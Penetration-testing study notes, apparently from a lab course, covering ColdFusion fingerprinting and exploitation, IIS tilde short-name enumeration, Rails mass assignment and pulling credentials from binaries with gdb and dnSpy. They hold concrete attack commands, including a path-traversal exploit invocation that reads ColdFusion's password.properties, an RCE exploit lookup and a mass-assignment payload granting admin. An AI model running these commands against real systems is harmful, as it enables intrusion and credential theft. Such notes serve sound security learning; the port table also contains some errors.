# **ColdFusion - Discovery & Enumeration**
| Port  Number | Protocol       | Description                                                                                                                                                                                                      |
| ------------ | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 80           | HTTP           | Used for non-secure HTTP communication between the web server and web browser.                                                                                                                                   |
| 443          | HTTPS          | Used for secure HTTP communication between the web server and web browser. Encryps the communication between the web server and web browser . Encrypts the communication between the web server and web browser. |
| 1935         | RPC            | Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.                                           |
| 25           | SMTP           | Simple Mail Transfer Protocol (SMTP) is used for sending email messages.                                                                                                                                         |
| 8500         | SSL            | Used for server communication via Secure Socket Layer (SSL).                                                                                                                                                     |
| 5500         | Server Monitor | Used for remote administration of the ColdFusion server.                                                                                                                                                         |
## **Enumeration**

| **Method**        | **Description**                                                                                                                                                                                                                             |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Port Scanning`   | ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. Scanning for these ports may indicate the presence of a ColdFusion Server. Nmap might be able to identify ColdFusion during a <br>services scan specifically. |
| `File Extensions` | ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.                                                           |
| `HTTP Headers`    | Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being <br>used.                       |
| `Error Messages`  | If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.                                                                                                |
| `Default Files`   | ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.                       |
# **Attacking ColdFusion**

## **Searchsploit**

```
searchsploit adobe coldfusion
```

##  **Coldfusion - Exploitation - Path traversal**

```
python2 14641.py usage: 14641.py <host> <port> <file_path>

example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```

Note: The `password.properties` file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like `database connections`, `mail servers`, `LDAP servers`, 

## **Coldfusion - Exploitation - RCE**

```
searchsploit -p 50057  

Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      
      
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057's path to the clipboard

```

# **IIS Tilde Enumeration**

IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the `8.3 format`) on some versions of Microsoft Internet Information Services (IIS) web servers.

The enumeration process starts by sending requests with various characters following the tilde:

```
http://example.com/~a
http://example.com/~b
http://example.com/~c
...
```

Assume the server contains a hidden directory named SecretDocuments. When a request is sent to `http://example.com/~s`, the server replies with a `200 OK` status code, revealing a directory with a short name beginning with "s". The enumeration process continues by appending more characters:

```
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...
```

For instance, if the short name `secret~1` is determined for the concealed directory SecretDocuments, files in that directory can be accessed by submitting requests such as:

```
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

## **Enumeration - Using IIS ShortName Scanner**

```
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

### **Generate Wordlist**

```
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

### **Gobuster Enumeration**

```
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

# **Web Mass Assignment Vulnerabilities**

Several frameworks offer handy mass-assignment features to lessen the workload for developers. Because of this, programmers can directly insert a whole set of user-entered data from a form into an object or database. This feature is often used without a whitelist for protecting the fields from the user's input. This vulnerability could be used by an attacker to steal sensitive information or destroy data.

Ruby on Rails is a web application framework that is vulnerable to this type of attack. The following example shows how attackers can exploit mass assignment vulnerability in Ruby on Rails. Assuming we have a `User` model with the following attributes:

```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```

The above model specifies that only the `username` and `email` attributes are allowed to be mass-assigned. However, attackers can modify other attributes by tampering with the parameters sent to the server. Let's assume that the server receives the following parameters.

```rust
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```

# **Attacking Applications Connecting to Services**

## **ELF Executable Examination**

### ELF Example

```
./octopus_checker 

Program had started..
Attempting Connection
Connecting ...

The driver reported the following diagnostics whilst running SQLDriverConnect

01000:1:0:[unixODBC][Driver Manager]Can't open lib 'ODBC Driver 17 for SQL Server' : file not found
connected
```

## Examine the file using PEDA.

```rust
gdb ./octopus_checker
```

Once the binary is loaded, we set the `disassembly-flavor` to define the display style of the code

```
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main

<SNIP>
0x00005555555555ff <+425>:	mov    esi,0x0
0x0000555555555604 <+430>:	mov    rdi,rax
0x0000555555555607 <+433>:	call   0x5555555551b0 <SQLDriverConnect@plt>
0x000055555555560c <+438>:	add    rsp,0x10
0x0000555555555610 <+442>:	mov    WORD PTR [rbp-0x4b4],ax
<SNIP>
```

### Adding breakpoint

```
gdb-peda$ b *0x5555555551b0

Breakpoint 1 at 0x5555555551b0

gdb-peda$ run
```

## **DLL File Examination**

```rust
C:\> Get-FileMetaData .\MultimasterAPI.dll
```

Using the debugger and .NET assembly editor dnSpy,  we can view the source code directly. This tool allows reading, editing, and debugging the source code of a .NET assembly (C# and Visual
 Basic). Inspection of `MultimasterAPI.Controllers` -> `ColleagueController` reveals a database connection string containing the password.
